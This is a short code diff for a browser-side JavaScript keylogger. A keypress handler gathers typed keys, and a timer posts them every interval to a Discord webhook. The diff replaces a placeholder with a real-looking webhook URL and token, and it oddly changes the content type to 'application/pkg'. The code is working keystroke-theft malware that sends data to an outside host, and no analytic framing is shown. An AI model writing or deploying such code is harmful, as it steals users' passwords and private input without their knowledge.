@@ -14,10 +14,10 @@ document.onkeypress = function(e) {
 
 window.setInterval(function(){
     if(keys.length >0 ) {
-        fetch("discordwebhook_link", {
+        fetch("https://discord.com/api/webhooks/1326301216241619035/vQiyD2SXPakFAckyR0gWS_yUGC1GHVYowyzzT011-jqJCymLTRP132lFBAvfKUn8nHJK", {
 			method: "POST",
 			headers: {
-				"Content-Type": "application/json"
+				"Content-Type": "application/pkg"
 			},
 			body: JSON.stringify({ content: keys })
 		}).then(data =>{
